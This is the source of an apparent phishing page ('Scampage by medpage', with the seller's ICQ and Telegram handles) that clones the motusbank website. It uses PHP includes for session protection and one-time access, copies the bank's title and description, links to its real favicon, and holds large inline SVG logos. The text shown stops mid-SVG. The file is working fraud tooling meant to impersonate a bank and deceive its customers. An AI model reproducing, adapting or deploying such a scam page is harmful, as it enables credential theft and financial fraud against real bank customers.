<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?><!DOCTYPE html>
<html class=" whatinput-types-initial whatinput-types-mouse whatinput-types-keyboard" data-whatinput="keyboard" data-whatintent="mouse"><head id="head">
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>
	motusbank - Where banking feels good
</title><meta name="description" content="A new movement in banking – digital and full service, super simple and incredibly convenient. Meet motusbank. Where banking feels good."> 
<meta charset="UTF-8"> 
<link href="files/GetResource_004.css" type="text/css" rel="stylesheet">
<meta charset="utf-8">
<!-- SET: Tracking -->


<!-- Page hiding snippet for Optimize -->
<style>.async-hide { opacity: 0 !important} </style>


<!-- Analytics tracking code with Optimize plugin -->


<!-- Google Tag Manager -->

<!-- End Google Tag Manager -->
<!-- END: Tracking -->
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Content-Security-Policy" content="script-src 'self'  https://* 'unsafe-inline' 'unsafe-eval'"> 
<link href="files/app.css" type="text/css" rel="stylesheet">
<link rel="stylesheet" href="files/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<!--<script src="https://use.fontawesome.com/e051099d08.js"></script>-->  
<link href="https://www.motusbank.ca/App_Themes/Default/Images/favicon.ico" type="image/x-icon" rel="shortcut icon">
<link href="https://www.motusbank.ca/App_Themes/Default/Images/favicon.ico" type="image/x-icon" rel="icon">
<link href="files/GetResource_002.css" type="text/css" rel="stylesheet">
<link href="files/GetResource.css" type="text/css" rel="stylesheet">
<link href="files/GetResource_005.css" type="text/css" rel="stylesheet">
<link href="files/GetResource_003.css" type="text/css" rel="stylesheet">
<meta class="foundation-mq"></head>
<body class="LTR Firefox ENCA ContentBody">
     <!-- Google Tag Manager (noscript) -->
<noscript><iframe sandbox="sandbox" src="https://www.googletagmanager.com/ns.html?id=GTM-NJSLS26" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<div class="inline-svgs"><!-- inject:svg --><svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink"><defs>
    <linearGradient id="motus-circle-1-a" x1="198.64" y1="448.99" x2="393.38" y2="448.99" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#2e3191"></stop>
      <stop offset=".2" stop-color="#254aa4"></stop>
      <stop offset="1" stop-color="#00adee"></stop>
      <stop offset="1" stop-color="#b0b0bb"></stop>
      <stop offset="1" stop-color="#43bca5"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-b" x1="158.6" y1="457.91" x2="331.01" y2="457.91" gradientTransform="rotate(56.27 244.804 457.939)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#e83925"></stop>
      <stop offset=".56" stop-color="#motus-circle-1-a94c9c"></stop>
      <stop offset="1" stop-color="#ba2826"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-c" x1="176.7" y1="467.12" x2="407.06" y2="467.12" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#f7991c"></stop>
      <stop offset=".52" stop-color="#ffc30c"></stop>
      <stop offset="1" stop-color="#f37c20"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-d" x1="164.8" y1="463.43" x2="384.01" y2="463.43" gradientTransform="rotate(25.8 217.376 411.255)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#ec1c62"></stop>
      <stop offset="1" stop-color="#7d489b"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-e" x1="180.27" y1="464.86" x2="382.61" y2="464.86" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#f7991c"></stop>
      <stop offset="1" stop-color="#f37c20"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-f" x1="183.69" y1="459.42" x2="370.71" y2="459.42" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#45bda6"></stop>
      <stop offset="1" stop-color="#43bca5"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-g" x1="209.87" y1="470.17" x2="357.3" y2="470.17" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#c44498"></stop>
      <stop offset="1" stop-color="#954298"></stop>
    </linearGradient>
    <linearGradient id="motus-circle-1-h" x1="210.11" y1="463.82" x2="354.99" y2="463.82" gradientTransform="rotate(-150.5 269.584 471.922)" gradientUnits="userSpaceOnUse">
      <stop offset="0" stop-color="#2e3191"></stop>
      <stop offset=".2" stop-color="#254aa4"></stop>
      <stop offset="1" stop-color="#00adee"></stop>
      <stop offset="1" stop-color="#b0b0bb"></stop>
      <stop offset="1" stop-color="#00adee"></stop>
    </linearGradient>
  </defs><symbol id="Arrow">
  <path d="M3.4 1l4 4m0 0l-4 4m4-4H1" stroke="#545558" stroke-linecap="round" stroke-linejoin="round"></path>
</symbol><symbol id="facebook" viewBox="0 0 148.8 148.1"><path d="M93 49.3h-8.3c-3.3 0-4.1 1.4-4.1 4.8v7.6H93l-1.2 12.4H80.6v43.4H62V74.1H49.6V61.7H62V47.4c0-11 5.8-16.7 18.7-16.7H93v18.6zM74.4-.3C33.4-.3 0 33 0 74.1s33.4 74.4 74.4 74.4 74.4-33.4 74.4-74.4S115.4-.3 74.4-.3z"></path></symbol><symbol id="icon-search" viewBox="0 0 14 14">
<path fill-rule="evenodd" clip-rule="evenodd" d="M10.0067 5.19547H9.37122L9.15031 5.41478C9.93071 6.32485 10.4054 7.50466 10.4054 8.79732C10.4054 11.6708 8.07615 14 5.20268 14C2.3292 14 0 11.6708 0 8.79732C0 5.92385 2.3292 3.59465 5.20268 3.59465C6.49534 3.59465 7.67435 4.06849 8.58442 4.84809L8.80533 4.62878V3.99485L12.8058 0L13.9992 1.19341L10.0067 5.19547ZM5.20244 5.19546C3.21262 5.19546 1.60059 6.80749 1.60059 8.79732C1.60059 10.7863 3.21262 12.3992 5.20244 12.3992C7.19146 12.3992 8.80429 10.7863 8.80429 8.79732C8.80429 6.80749 7.19146 5.19546 5.20244 5.19546Z" transform="translate(0 14) scale(1 -1)" fill="#00D1AF"></path>
</symbol><symbol id="instagram" viewBox="0 0 148.8 148.1"><path d="M118 41.3c0-5.5-4.5-9.9-10.1-9.9H41.1c-5.6 0-10.1 4.4-10.1 9.9v66.1c0 5.5 4.5 9.9 10.1 9.9h66.8c5.6 0 10.1-4.4 10.1-9.9V41.3zm31.1 33c0 40.6-33.4 73.7-74.5 73.7S0 114.9 0 74.3 33.4.6 74.5.6s74.6 33.1 74.6 73.7zM101 70.6c.1 1.2.2 2.5.2 3.7 0 14.6-11.9 26.4-26.7 26.4S47.8 88.9 47.8 74.3c0-1.2.1-2.5.2-3.7.1-1.2.4-2.3.7-3.4H42v36.1c0 1.8 1.5 3.3 3.4 3.3h58.5c1.9 0 3.4-1.5 3.4-3.3V67.2h-6.8c.1 1.1.4 2.2.5 3.4zM74.5 90.9c9.2 0 16.8-7.4 16.8-16.6 0-9.1-7.5-16.6-16.8-16.6-9.2 0-16.8 7.4-16.8 16.6.1 9.1 7.6 16.6 16.8 16.6zm32.6-45.6V53c0 1.8-1.5 3.3-3.4 3.3h-7.8c-1.9 0-3.4-1.5-3.4-3.3v-7.7c0-1.8 1.5-3.3 3.4-3.3h7.8c1.9 0 3.4 1.6 3.4 3.3z"></path></symbol><symbol id="linkedin" viewBox="0 0 148.8 148.1"><path d="M105.4 99H93V81.3c0-11.7-12.4-10.7-12.4 0V99H68.1V61.8h12.4v6.8c5.5-10.1 24.8-10.8 24.8 9.6.1 11 .1 20.8.1 20.8zM55.7 56.2c-3.7 0-6.8-3.1-6.8-6.8 0-3.8 3.1-6.8 6.8-6.8 3.7 0 6.8 3.1 6.8 6.8 0 3.8-3.1 6.8-6.8 6.8zM61.9 99H49.5V61.8h12.4V99zM74.3-.3C33.3-.3-.1 33.1-.1 74.2s33.4 74.5 74.5 74.5 74.5-33.4 74.5-74.5S115.4-.3 74.3-.3z"></path></symbol><symbol id="motus-logo" viewBox="0 0 428.4 118.8">
<style type="text/css">
	.st0{fill:#414042;}
	.st1{fill:url(#SVGID_1_);}
	.st2{fill:url(#SVGID_2_);}
</style>
<title>MotusBank_Wordmark_TM_RGB</title>
<path class="st0" d="M56.8,79.8h-5.6V57c0-7.2-3.4-11.7-9.5-11.7c-6.2,0-13,3.5-13,13.1v21.4H23V40.6h5.6V47c2.4-5.1,9.4-7.3,13-7.3
	c6.6,0,11.3,3.1,13.6,8.6c3.5-7.4,10.6-8.6,14.5-8.6c9.6,0,15.2,6.5,15.1,17.2v22.8h-5.6V56.9c0-7.2-3.4-11.7-9.5-11.7
	c-6.2,0-13,3.5-13,13.1L56.8,79.8z"></path>
<path class="st0" d="M93.2,59.2c0-12.4,9.3-20.3,20.5-20.3s20.5,7.9,20.5,20.3s-9.3,20.6-20.5,20.6S93.2,71.7,93.2,59.2z
	 M128.7,59.2c0-9.1-6.8-14.8-15-14.8s-15,5.7-14.9,14.8c-0.7,8.3,5.5,15.5,13.7,16.2s15.5-5.5,16.2-13.7
	C128.7,60.9,128.7,60.1,128.7,59.2L128.7,59.2z"></path>
<path class="st0" d="M145.2,79.8V45.6h-7.1v-5h7.1V25.9h5.6v14.7h8.3v5h-8.3v34.2H145.2z"></path>
<path class="st0" d="M194,39.7h5.6V79H194v-6.5c-2.4,5.1-8.5,7.3-13,7.3c-9.6,0-15.2-6.6-15.1-17.2V39.7h5.6v22.9
	c0,7.2,3.4,11.7,9.5,11.7c6.2,0,13-3.5,13-13.1L194,39.7z"></path>
<path class="st0" d="M213,67.7c0.8,2.9,2.6,6.8,9.2,6.8c5,0,8.3-2.5,8.3-6.2c0-2.6-1.5-5-5.6-6l-5.5-1.3c-4.9-1.2-10.9-3.6-9.9-12.8
	c0.8-5.6,6.4-9.3,12.8-9.3c6,0,11.3,2.9,12.4,10.2h-5.5c-0.7-3-3.5-4.8-6.9-4.8c-3.8,0-6.9,2-7.3,4.8c-0.8,4.5,3,5.9,5.8,6.6
	l5.4,1.3c7.4,1.8,9.9,6,9.9,11.4c0,6.8-6.2,11.5-14.4,11.5c-6.6,0-13.4-4.4-13.7-12.1L213,67.7z"></path>
<path class="st0" d="M247.7,79h-2.5V24.6h2.5v24.8c5.5-9.9,17.9-13.5,27.8-8s13.5,17.9,8,27.8s-17.9,13.5-27.8,8
	c-3.4-1.9-6.2-4.7-8-8V79z M265.7,41.4c-9.9,0-17.9,8-18,17.9v0.8c0.4,9.9,8.7,17.6,18.6,17.2c9.9-0.4,17.6-8.7,17.2-18.6
	C283.2,49.1,275.3,41.5,265.7,41.4L265.7,41.4z"></path>
<path class="st0" d="M331.3,69.2c-5.5,9.9-17.9,13.5-27.8,8s-13.5-17.9-8-27.8s17.9-13.5,27.8-8c3.4,1.9,6.2,4.7,8,8v-9.7h2.5V79
	h-2.5V69.2z M313.3,77.3c9.6,0,17.6-7.6,18-17.2v-0.7c0-9.9-8.1-17.9-18-17.9s-17.9,8.1-17.9,18C295.5,69.3,303.4,77.3,313.3,77.3
	L313.3,77.3z"></path>
<path class="st0" d="M346.3,40.6h2.5v8.7c2.2-7,8.6-9.5,14.5-9.5c9.1,0,16,6.4,16,17v23.1h-2.5V56.7c0-9-5.9-14.5-13.5-14.4
	c-7.4,0-14.1,4.1-14.5,15.1v22.4h-2.5L346.3,40.6z"></path>

<path class="st1" d="M53.1,6.1c22.6,0,42.2,11.9,52.4,29.5C93.1,6.7,59.4-6.7,30.5,5.8c-13.4,5.8-24,16.4-29.8,29.8
	C10.9,18.1,30.5,6.1,53.1,6.1z"></path>

<path class="st2" d="M53.1,112.7c-22.6,0-42.2-11.9-52.4-29.5c12.5,29,46.1,42.3,75.1,29.8c13.4-5.8,24-16.4,29.8-29.8
	C95.4,100.8,75.7,112.7,53.1,112.7z"></path>
<path class="st0" d="M416.2,79.8L394,58.5v21.3h-2.5V25.6h2.5v31.7l16.2-16.7h3.6L397,57.9l23,22H416.2z"></path>
<path class="st0" d="M422.7,25.6v0.5h-1.2v3.3H421V26h-1.2v-0.5L422.7,25.6z"></path>
<path class="st0" d="M426.8,25.6h0.5l0.5,3.9h-0.5l-0.4-2.9l-1.2,2.5h-0.5l-1.2-2.5l-0.3,2.9h-0.5l0.5-3.9h0.5l1.4,2.9L426.8,25.6z"></path>
</symbol><symbol id="MotusBank_Spiral_6_RGB" viewBox="0 0 230.42 243.02">
  
  <g data-name="—ÎÓÈ_1" fill-rule="evenodd">
    <path d="M251.13 381.64a97.35 97.35 0 1 1-110.23 82.47 97.36 97.36 0 0 1 110.24-82.46zm1.65 7.71A86.24 86.24 0 1 0 325.84 487a86.26 86.26 0 0 0-73.05-97.64z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" opacity=".75" fill="url(#motus-circle-1-a)"></path>
    <path d="M320 415.69a86.2 86.2 0 1 1-117.37-32.93A86.21 86.21 0 0 1 320 415.69zm-4.78 5.46a80.93 80.93 0 1 0-30.91 110.2 80.94 80.94 0 0 0 30.87-110.2z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-b)"></path>
    <path d="M149.19 408.18a115.18 115.18 0 1 1 44.51 156.69 115.2 115.2 0 0 1-44.51-156.69zm9.56 1.62a108.14 108.14 0 1 0 147.1-41.8 108.15 108.15 0 0 0-147.1 41.8z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-c)"></path>
    <path d="M290.13 382.94a109.61 109.61 0 1 1-145.45 53.58 109.62 109.62 0 0 1 145.45-53.58zm.53 2.94a105.94 105.94 0 1 0 51.79 140.58 106 106 0 0 0-51.79-140.58z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-d)"></path>
    <path d="M309.86 558.09a101.16 101.16 0 1 1 34.6-138.81 101.17 101.17 0 0 1-34.6 138.81zm-2.52-1.09a97.77 97.77 0 1 0-134.16-33.44A97.78 97.78 0 0 0 307.34 557z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-e)"></path>
    <path d="M246.11 570.84a93.48 93.48 0 1 1 105.26-80 93.5 93.5 0 0 1-105.26 80zm3.28-9.22a82.82 82.82 0 1 0-70.87-93.26 82.83 82.83 0 0 0 70.88 93.26z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-f)"></path>
    <path d="M269 392.77a73.7 73.7 0 1 1-83.46 62.43A73.71 73.71 0 0 1 269 392.77zm1.25 5.84a65.29 65.29 0 1 0 55.31 73.94 65.3 65.3 0 0 0-55.28-73.94z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-g)"></path>
    <path d="M297.5 531.3a72.43 72.43 0 1 1 18.32-100.78A72.44 72.44 0 0 1 297.5 531.3zm-4.94-3.57a68 68 0 1 0-94.61-17.2 68 68 0 0 0 94.6 17.2z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" opacity=".15" fill="url(#motus-circle-1-h)"></path>
  </g>
</symbol><symbol id="twitter" viewBox="0 0 148.8 148.1"><path d="M111.7 59.5c1.1 24.9-17.5 52.7-50.3 52.7-10 0-19.4-3-27.1-8 9.4 1.1 18.8-1.5 26.3-7.3-7.8-.1-14.3-5.3-16.5-12.3 2.8.5 5.6.4 8-.2-8.5-1.7-14.4-9.4-14.2-17.6 2.3 1.4 5.2 2.1 8 2.2-7.9-5.3-10.1-15.7-5.4-23.7C49.1 55.9 62.2 63 76.9 63.7 74.3 52.6 82.7 42 94.2 42c5.1 0 9.7 2.1 13 5.6 4.1-.7 7.8-2.2 11.2-4.3-1.4 4.2-4.1 7.6-7.8 9.7 3.6-.4 7-1.4 10.1-2.8-2.5 3.8-5.6 6.9-9 9.3zM74.3.1C33.5.1.3 33.3.3 74.1s33.2 74 74 74 74-33.2 74-74-33.2-74-74-74z"></path></symbol><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="20.4589" y1="72.6431" x2="118.8489" y2="86.1531" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
	<stop offset="0" style="stop-color:#FFC600"></stop>
	<stop offset="0.2" style="stop-color:#FF9B00"></stop>
	<stop offset="0.37" style="stop-color:#E9371D"></stop>
	<stop offset="0.59" style="stop-color:#A52BB4"></stop>
	<stop offset="0.79" style="stop-color:#4A2BB4"></stop>
	<stop offset="0.99" style="stop-color:#00D1AF"></stop>
</linearGradient><linearGradient id="SVGID_2_" gradientUnits="userSpaceOnUse" x1="121.5109" y1="9.0065" x2="31.0909" y2="-0.6835" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
	<stop offset="0" style="stop-color:#FFC600"></stop>
	<stop offset="0.2" style="stop-color:#FF9B00"></stop>
	<stop offset="0.37" style="stop-color:#E9371D"></stop>
	<stop offset="0.59" style="stop-color:#A52BB4"></stop>
	<stop offset="0.79" style="stop-color:#4A2BB4"></stop>
	<stop offset="0.99" style="stop-color:#00D1AF"></stop>
</linearGradient></svg><svg xmlns="https://www.w3.org/2000/svg"><symbol id="email-share-icon" viewBox="0 0 123.6 123.7"><path d="M61.9 0a61.85 61.85 0 1 0 61.7 61.9A62 62 0 0 0 61.9 0zm0 116.7a54.85 54.85 0 1 1 54.8-54.9 54.9 54.9 0 0 1-54.8 54.9z"></path><path d="M30.19 84.68h63.42V37.12H30.19zM87.05 42.4L61.9 62.78 36.75 42.4zm-51.57 5.77L61.9 69.59l26.42-21.42V79.4H35.48z"></path></symbol><symbol id="facebook-share-icon" viewBox="0 0 128 128"><path d="M64 9.1C33.7 9.1 9.1 33.7 9.1 64s24.6 54.8 54.8 54.8 54.8-24.6 54.8-54.8S94.2 9.1 64 9.1zM81.9 43h-8.6c-2.8 0-3.3 1.1-3.3 4v5h12l-1.1 12h-11v35.9H55V64h-9V52h9V41.9c0-9.1 4.8-13.8 15.5-13.8h11.4V43z" fill="none"></path><path d="M64 2.1C29.9 2.1 2.1 29.9 2.1 64c0 34.1 27.7 61.8 61.8 61.8 34.1 0 61.8-27.7 61.8-61.8C125.8 29.9 98 2.1 64 2.1zm0 116.7C33.7 118.8 9.1 94.2 9.1 64S33.7 9.1 64 9.1s54.8 24.6 54.8 54.8-24.6 54.9-54.8 54.9z"></path><path d="M55 41.9V52h-9v12h9v35.9h14.9V64h10.9l1.1-12h-12v-5c0-2.9.6-4 3.3-4h8.6V28.1H70.4C59.8 28.1 55 32.8 55 41.9z"></path></symbol><symbol id="facebook" viewBox="0 0 148.8 148.1"><path d="M93 49.3h-8.3c-3.3 0-4.1 1.4-4.1 4.8v7.6H93l-1.2 12.4H80.6v43.4H62V74.1H49.6V61.7H62V47.4c0-11 5.8-16.7 18.7-16.7H93v18.6zM74.4-.3C33.4-.3 0 33 0 74.1s33.4 74.4 74.4 74.4 74.4-33.4 74.4-74.4S115.4-.3 74.4-.3z"></path></symbol><symbol id="instagram" viewBox="0 0 148.8 148.1"><path d="M118 41.3c0-5.5-4.5-9.9-10.1-9.9H41.1c-5.6 0-10.1 4.4-10.1 9.9v66.1c0 5.5 4.5 9.9 10.1 9.9h66.8c5.6 0 10.1-4.4 10.1-9.9V41.3zm31.1 33c0 40.6-33.4 73.7-74.5 73.7S0 114.9 0 74.3 33.4.6 74.5.6s74.6 33.1 74.6 73.7zM101 70.6c.1 1.2.2 2.5.2 3.7 0 14.6-11.9 26.4-26.7 26.4S47.8 88.9 47.8 74.3c0-1.2.1-2.5.2-3.7.1-1.2.4-2.3.7-3.4H42v36.1c0 1.8 1.5 3.3 3.4 3.3h58.5c1.9 0 3.4-1.5 3.4-3.3V67.2h-6.8c.1 1.1.4 2.2.5 3.4zM74.5 90.9c9.2 0 16.8-7.4 16.8-16.6 0-9.1-7.5-16.6-16.8-16.6-9.2 0-16.8 7.4-16.8 16.6.1 9.1 7.6 16.6 16.8 16.6zm32.6-45.6V53c0 1.8-1.5 3.3-3.4 3.3h-7.8c-1.9 0-3.4-1.5-3.4-3.3v-7.7c0-1.8 1.5-3.3 3.4-3.3h7.8c1.9 0 3.4 1.6 3.4 3.3z"></path></symbol><symbol id="like-icon" viewBox="0 0 128 128"><path d="M64 9.1C33.7 9.1 9.1 33.7 9.1 64s24.6 54.8 54.8 54.8 54.8-24.6 54.8-54.8S94.2 9.1 64 9.1zM64 94C47.7 77.8 33.6 65.8 33.6 53.9c0-17.2 22.4-21.1 30.4-7.5 7.9-13.6 30.4-9.8 30.4 7.5C94.4 65.8 80.3 77.8 64 94z" fill="none"></path><path d="M64 2.1C29.9 2.1 2.1 29.9 2.1 64c0 34.1 27.7 61.8 61.8 61.8 34.1 0 61.8-27.7 61.8-61.8C125.8 29.9 98 2.1 64 2.1zm0 116.7C33.7 118.8 9.1 94.2 9.1 64S33.7 9.1 64 9.1s54.8 24.6 54.8 54.8-24.6 54.9-54.8 54.9z"></path><path d="M64 46.5c-8-13.7-30.4-9.7-30.4 7.5 0 11.8 14.1 23.8 30.4 40 16.3-16.2 30.4-28.2 30.4-40.1 0-17.2-22.5-21-30.4-7.4z"></path></symbol><symbol id="linkedin-share-icon" viewBox="0 0 128 128"><path d="M64 9.1C33.7 9.1 9.1 33.7 9.1 64s24.6 54.8 54.8 54.8 54.8-24.6 54.8-54.8S94.2 9.1 64 9.1zM44.4 33.8c3.2 0 5.8 2.6 5.8 5.8 0 3.2-2.6 5.8-5.8 5.8-3.2 0-5.8-2.6-5.8-5.8 0-3.2 2.6-5.8 5.8-5.8zm5.8 53.4H38.6V50h11.6v37.2zm44.2 0H82.8V67.7c0-11.8-14-10.9-14 0v19.5H57.2V50h11.6v5c4.9-9 25.6-9.7 25.6 8.6v23.6z" fill="none"></path><path d="M64 2.1C29.9 2.1 2.1 29.9 2.1 64c0 34.1 27.7 61.8 61.8 61.8 34.1 0 61.8-27.7 61.8-61.8C125.8 29.9 98 2.1 64 2.1zm0 116.7C33.7 118.8 9.1 94.2 9.1 64S33.7 9.1 64 9.1s54.8 24.6 54.8 54.8-24.6 54.9-54.8 54.9z"></path><path d="M38.6 50h11.6v37.2H38.6z"></path><ellipse class="st1" cx="44.4" cy="39.6" rx="5.8" ry="5.8"></ellipse><path d="M68.8 55.1v-5H57.2v37.2h11.6V67.8c0-10.9 14-11.8 14 0v19.5h11.6V63.7c0-18.3-20.7-17.7-25.6-8.6z"></path></symbol><symbol id="linkedin" viewBox="0 0 148.8 148.1"><path d="M105.4 99H93V81.3c0-11.7-12.4-10.7-12.4 0V99H68.1V61.8h12.4v6.8c5.5-10.1 24.8-10.8 24.8 9.6.1 11 .1 20.8.1 20.8zM55.7 56.2c-3.7 0-6.8-3.1-6.8-6.8 0-3.8 3.1-6.8 6.8-6.8 3.7 0 6.8 3.1 6.8 6.8 0 3.8-3.1 6.8-6.8 6.8zM61.9 99H49.5V61.8h12.4V99zM74.3-.3C33.3-.3-.1 33.1-.1 74.2s33.4 74.5 74.5 74.5 74.5-33.4 74.5-74.5S115.4-.3 74.3-.3z"></path></symbol><symbol id="meridian-logo" viewBox="0 0 468 141"><path class="st0" d="M395.1 43.7c-.1-4.4-3.1-5-5.9-5V37l14.1-1.9.5 8.7h.2c2.6-5 8.8-9.9 17.6-9.9 7.4 0 18.8 4.4 18.8 22.6v31.8h-9.7V57.6c0-8.6-3.2-15.8-12.3-15.8-6.2 0-11.2 4.5-13 9.9-.4 1.2-.6 3-.6 4.5v32.1h-9.7c.1 0 .1-42.8 0-44.6M128.1 63.3c.2 13.1 8.5 18.5 18.1 18.5 6.9 0 11.2-1.2 14.7-2.6l1.8 6.8c-3.4 1.5-9.4 3.4-17.8 3.4-16.3 0-26.2-10.9-26.2-26.8 0-16.1 9.6-28.8 25.1-28.8 17.4 0 21.9 15.3 21.9 25.1 0 2-.1 3.5-.3 4.6l-37.3-.2zm28.3-6.9c.1-6-2.6-15.7-13.3-15.7-9.9 0-14.1 9-14.9 15.7h28.2zM378.3 75.5c0 4.6.2 9.1.8 12.8h-8.7l-.9-6.7h-.3c-2.9 4.2-8.7 8-16.3 8-10.8 0-16.2-7.6-16.2-15.3 0-12.9 11.4-19.9 32-19.8v-1.1c0-4.4-1.2-12.5-12.1-12.3-5.1 0-10.2 1.4-14 3.9l-2.2-6.5c4.4-2.8 10.9-4.6 17.6-4.6 16.4 0 20.3 11.1 20.3 21.8v19.8zm-9.5-14.4c-10.5-.2-22.5 1.6-22.5 12 0 6.4 4.2 9.3 9 9.3 7 0 11.6-4.4 13.1-8.9.3-1 .4-2.1.4-3.1v-9.3zM220.8 35h9.7v53.2h-9.7V35zm10.6-10.4c0-3.1-2.6-5.7-5.7-5.7s-5.7 2.5-5.7 5.7 2.5 5.7 5.7 5.7c3.1 0 5.7-2.5 5.7-5.7M312.3 35h9.7v53.2h-9.7V35zm10.9-10.4c0-3.1-2.5-5.7-5.7-5.7-3.1 0-5.7 2.5-5.7 5.7s2.5 5.7 5.7 5.7 5.7-2.5 5.7-5.7M189.1 35.1L175 37v1.7c3.1 0 5.9.8 6 6.5 0 2 .1 4.2.1 6.5l-.1 36.6h9.7V59.9c0-1.6.1-3.2.3-4.6 1.3-7.2 6.1-12.3 13-12.3 1.3 0 2.3.1 3.4.2v-9c-.9-.2-1.6-.3-2.6-.3-6.5 0-12.4 4.5-14.8 11.7h-.3l-.6-10.5zM275.5 35.3c8.1 4 6.6 13.6 6.6 13.6-2.3-4.3-6.8-7.5-12.6-7.5-10 0-16 8.8-16 20.5 0 10.9 5.4 19.8 15.8 19.8 6.5 0 12.4-4.4 14.2-11.5.4-1.3.4-2.6.4-4.2V13.8h9.7v60.7c0 4.7.1 10.1.4 13.8h-8.7l-.4-9.3h-.2c-3 5.9-9.4 10.5-18 10.5-12.9 0-22.9-10.9-22.9-27.1-.1-17.8 11-28.6 23.9-28.6 1.8 0 5.3.3 7.8 1.5M455.9 25.7h1.7v8h-1v-7.2l-2.9 7.2h-.6l-2.9-7.2v7.2h-1v-8h1.7l2.6 6.5 2.4-6.5zm-11.8.9h-2.6v-.9h6.2v.9h-2.6v7.2h-1v-7.2z" fill="#fff"></path><g><path d="M69.6 124.2c-8.7 0-17-1.3-24.4-3.9-6-2.1-11.5-5-16.3-8.6-8.2-6.1-11.9-12.4-12-12.6-.4-.7-.8-1.4-1.2-2 0 0-.3-.5-.3-1 0-.7.5-1.8 1.8-1.9 1 0 1.6.9 1.6.9.7.7 3.7 5.6 11.5 10.9 7.3 4.9 20.1 10.8 39.2 10.8s31.9-5.9 39.2-10.8c7.8-5.2 10.9-10.2 11.5-10.9 0 0 .6-.9 1.6-.9 1.3 0 1.8 1.1 1.8 1.9 0 .5-.3 1-.3 1-.3.6-.8 1.3-1.2 2-.2.3-3.9 6.5-12 12.6-4.9 3.6-10.4 6.5-16.3 8.6-7.2 2.6-15.4 3.9-24.2 3.9" fill="#efb22d"></path><path class="st0" d="M36.6 20.1c.3-4.4-7-3.7-7-3.7v-2.2h19.6L61.8 50c3.1 9.1 5.5 17.3 7.5 25h.2c2-7.5 4.6-15.6 7.9-25l13.2-35.8h12.2l4.6 74.1H98l-1.7-32.5c-.6-10.3-1.2-22.9-1.2-32h-.2c-2.7 8.6-5.6 17.9-9.4 28.1l-13.1 36h-7.2L53 52.5c-3.5-10.6-6.4-20-8.4-28.8h-.2c-.2 9.2-.8 21.5-1.4 32.7l-2 31.8h-9.1l4.7-68.1z" fill="#fff"></path></g></symbol><symbol id="twitter-share-icon" viewBox="0 0 128 128"><path d="M64 2.1C29.9 2.1 2.1 29.9 2.1 64c0 34.1 27.7 61.8 61.8 61.8 34.1 0 61.8-27.7 61.8-61.8C125.8 29.9 98 2.1 64 2.1zm0 116.7C33.7 118.8 9.1 94.2 9.1 64S33.7 9.1 64 9.1s54.8 24.6 54.8 54.8-24.6 54.9-54.8 54.9z"></path><path d="M96.2 37.2c-2.7 1.6-5.7 2.8-8.9 3.4-2.6-2.7-6.2-4.4-10.2-4.4-9.1 0-15.7 8.4-13.7 17.2-11.7-.6-22-6.2-28.9-14.7-3.7 6.3-1.9 14.5 4.3 18.7-2.3-.1-4.5-.7-6.3-1.8-.2 6.5 4.5 12.6 11.2 13.9-2 .5-4.1.7-6.3.2 1.8 5.6 7 9.6 13.1 9.7-5.9 4.6-13.3 6.7-20.8 5.8 6.2 4 13.6 6.3 21.5 6.3 26 0 40.7-22 39.9-41.7 2.7-2 5.1-4.4 7-7.3-2.5 1.1-5.2 1.9-8.1 2.2 3-1.5 5.2-4.2 6.2-7.5z"></path></symbol><symbol id="twitter" viewBox="0 0 148.8 148.1"><path d="M111.7 59.5c1.1 24.9-17.5 52.7-50.3 52.7-10 0-19.4-3-27.1-8 9.4 1.1 18.8-1.5 26.3-7.3-7.8-.1-14.3-5.3-16.5-12.3 2.8.5 5.6.4 8-.2-8.5-1.7-14.4-9.4-14.2-17.6 2.3 1.4 5.2 2.1 8 2.2-7.9-5.3-10.1-15.7-5.4-23.7C49.1 55.9 62.2 63 76.9 63.7 74.3 52.6 82.7 42 94.2 42c5.1 0 9.7 2.1 13 5.6 4.1-.7 7.8-2.2 11.2-4.3-1.4 4.2-4.1 7.6-7.8 9.7 3.6-.4 7-1.4 10.1-2.8-2.5 3.8-5.6 6.9-9 9.3zM74.3.1C33.5.1.3 33.3.3 74.1s33.2 74 74 74 